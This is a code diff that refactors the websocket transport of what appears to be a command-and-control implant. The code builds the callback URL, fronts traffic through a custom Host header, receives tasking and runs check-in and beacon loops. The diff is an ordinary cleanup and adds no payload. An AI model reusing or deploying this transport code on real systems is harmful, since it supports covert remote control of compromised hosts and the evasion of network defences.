@@ -39,56 +39,44 @@ namespace Agent.Profiles.Websocket
                 ChannelConfig.Decode(),
                 WebsocketChannelOptionsJsonContext.Default.WebsocketChannelOptions)
                 ?? throw new InvalidOperationException("Invalid Websocket profile configuration");
-            int callbackPort = opts.CallbackPort;
-            string callbackHost = opts.CallbackHost;
             this.endpoint = opts.Endpoint;
-            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.url = $"{opts.CallbackHost}:{opts.CallbackPort}/{this.endpoint}";
             this.userAgent = opts.UserAgent;
             this.hostHeader = opts.DomainFront;
             this.maxAttempts = 5;
             this.connectAttempt = 0;
 
-            var factory = new Func<ClientWebSocket>(() =>
-            {
-                var client = new ClientWebSocket
-                {
-                    Options =
-                    {
-                        KeepAliveInterval = TimeSpan.FromSeconds(0),
-                        // Proxy = ...
-                        // ClientCertificates = ...
-                    }
-                };
-
-                this._client.ReconnectTimeout = null;
-
-                if (!String.IsNullOrEmpty(this.hostHeader))
-                {
-                    client.Options.SetRequestHeader("Host", this.hostHeader);
-                }
-
-                client.Options.SetRequestHeader("Accept-Type", "Push");
-                //%CUSTOMHEADERS%
-
-                return client;
-            });
-
-
-            this._client = new WebsocketClient(new Uri(this.url), factory);
+            this._client = new WebsocketClient(new Uri(this.url), CreateWebSocket);
             startClient = () => _client.Start();
             clientIsRunning = () => _client.IsRunning;
-            this._client.MessageReceived.Subscribe(msg =>
-            {
-                HandleInboundMessage(msg.Text);
-            });
+            this._client.MessageReceived.Subscribe(msg => HandleInboundMessage(msg.Text));
+            this._client.ReconnectionHappened.Subscribe(_ => { });
+            this._client.DisconnectionHappened.Subscribe(_ => { });
+        }
 
-
-            this._client.ReconnectionHappened.Subscribe(info =>
+        private ClientWebSocket CreateWebSocket()
+        {
+            var client = new ClientWebSocket
             {
-            });
-            this._client.DisconnectionHappened.Subscribe(info => {
-            
-            });
+                Options =
+                {
+                    KeepAliveInterval = TimeSpan.FromSeconds(0),
+                    // Proxy = ...
+                    // ClientCertificates = ...
+                }
+            };
+
+            this._client.ReconnectTimeout = null;
+
+            if (!string.IsNullOrEmpty(this.hostHeader))
+            {
+                client.Options.SetRequestHeader("Host", this.hostHeader);
+            }
+
+            client.Options.SetRequestHeader("Accept-Type", "Push");
+            //%CUSTOMHEADERS%
+
+            return client;
         }
 
         private void HandleInboundMessage(string content)
@@ -116,13 +104,10 @@ namespace Agent.Profiles.Websocket
                 }
 
                 GetTaskingResponse? gtr = JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                if (gtr?.action != "get_tasking")
+                if (gtr?.action == "get_tasking")
                 {
-                    return;
+                    SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
                 }
-
-                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                SetTaskingReceived?.Invoke(this, tra);
             }
             catch
             {
@@ -144,26 +129,15 @@ namespace Agent.Profiles.Websocket
                 this.connectAttempt++;
             } while (this.connectAttempt <= this.maxAttempts);
 
-            if (!sent)
-            {
-                return new CheckinResponse { status = "failed" };
-            }
-
-            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
+            if (!sent || !await CheckinResponseWait.WaitAsync(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
             {
                 return new CheckinResponse { status = "failed" };
             }
 
             this.checkedIn = true;
-
             return this.cir!;
         }
 
-        private static Task<bool> WaitForCheckinResponse(
-            ManualResetEventSlim signal,
-            TimeSpan timeout,
-            CancellationToken cancellationToken) =>
-            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
         public async Task StartBeacon()
         {
             while (!cancellationTokenSource.Token.IsCancellationRequested)
@@ -188,7 +162,7 @@ namespace Agent.Profiles.Websocket
                         result => result);
                     this.connectAttempt = delivered ? 0 : this.connectAttempt + 1;
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
                     this.connectAttempt++;
                 }
@@ -201,6 +175,7 @@ namespace Agent.Profiles.Websocket
                 }
             }
         }
+
         public bool StopBeacon()
         {
             this.cancellationTokenSource.Cancel();
